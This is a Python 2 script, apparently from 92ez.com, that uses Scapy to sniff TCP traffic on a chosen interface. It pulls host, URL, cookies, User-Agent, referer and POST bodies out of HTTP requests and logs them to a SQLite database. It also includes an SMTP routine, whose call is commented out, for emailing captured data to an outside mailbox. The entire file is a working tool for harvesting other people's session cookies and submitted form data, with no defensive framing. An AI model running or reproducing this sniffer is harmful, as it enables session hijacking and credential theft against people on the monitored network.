#!/usr/bin/env python
# coding=utf-8
# code by 92ez.com

from email.mime.text import MIMEText
from scapy.all import *
import smtplib
import sqlite3
import os
import sys

def dealPackage(packet):
	
	ip_dst = packet.sprintf("{IP:%IP.dst%}")
	ip_src = packet.sprintf("{IP:%IP.src%}")
	port_dst = packet.sprintf("{TCP:%TCP.dport%}")
	port_src = packet.sprintf("{TCP:%TCP.sport%}")

	lines = packet.sprintf("{Raw:%Raw.load%}").replace("'","").split(r"\r\n")

	if lines[0] != "":
		saveToDB(ip_src,ip_dst,port_src,port_dst,lines)
		# sendMail('***@qq.com','Notice ! Found Data!','<br>'.join(lines))

def saveToDB(ip_src,ip_dst,port_src,port_dst,data):

	this_type = ''
	this_host = ''
	this_method = ''
	this_UA = ''
	this_cookie = ''
	this_referer = ''
	this_uri = ''
	this_data = ''
	this_server = ''
	this_ctype = ''
	this_url = ''

	try:
		cx = sqlite3.connect(sys.path[0]+"/httplog.db")
		cx.text_factory = str
		cu = cx.cursor()

		if 'GET' in data[0] or 'POST' in data[0]:
			this_type = 'Request'
		else:
			this_type = 'Response'

		if this_type == 'Request':

			this_method = data[0].split(' ')[0].replace('"','')
			this_uri = data[0].split(' ')[1]
			this_data = data[-1]

			for line in data[0:-2]:
				if 'Host: ' in line:
					this_host = line.split('Host: ')[1]
				if 'User-Agent: ' in line:
					this_UA = line.split('User-Agent: ')[1]
				if 'Cookie: ' in line:
					this_cookie = line.split('Cookie: ')[1]
				if 'Referer: ' in line:
					this_referer = line.split('Referer: ')[1]

			this_url = this_host + this_uri	

			if len(this_host) > 0:
				print ip_src+' ==> '+ip_dst
				print this_url
				cu.execute("insert into record (ipsrc,ipdst,url,reqType,cookies,referer,data,ua) values (?,?,?,?,?,?,?,?)", (ip_src,ip_dst,this_url,this_method,this_cookie,this_referer,this_data,this_UA))
				cx.commit()
		else:

			for line in data:
				if 'Server: ' in line:
					this_server = line.split('Server: ')[1]
				if 'Content-Type: ' in line:
					this_ctype = line.split('Content-Type: ')[1]

		cu.close()
		cx.close()
	except Exception, e:
		print e

def sendMail(receiver, title, body):
	host = 'smtp.126.com'
	port = 25
	sender = '***@126.com'
	pwd = '***'

	msg = MIMEText(body, 'html')
	msg['subject'] = title
	msg['from'] = sender
	msg['to'] = receiver

	try:
		s = smtplib.SMTP(host, port)
		s.login(sender, pwd)
		s.sendmail(sender, receiver, msg.as_string())
		print '[*] The mail named %s to %s is sent successly.' % (title, receiver)
	except Exception,e:
		sys.exit('[x] Send email failed! Exception is %s.' % e)

def doSniffer():
	sniff_iface = sys.argv[1]
	try:
		print '[√] Sniffing on '+sniff_iface+'!'
		sniff(iface = sniff_iface,prn = dealPackage,lfilter = lambda p: str(p),filter = "tcp")
		# sniff(iface = sniff_iface,prn = dealPackage,lfilter = lambda p: "HTTP" in str(p),filter = "tcp")
		# sniff(iface = sniff_iface,prn = dealPackage,lfilter=lambda p: "GET" in str(p) or "POST" in str(p),filter="tcp")
	except Exception,e:
		sys.exit('[x] Can not do sniff on %s! Please check! Exception is %s' % (sniff_iface,e))

if __name__ == '__main__':
	doSniffer()
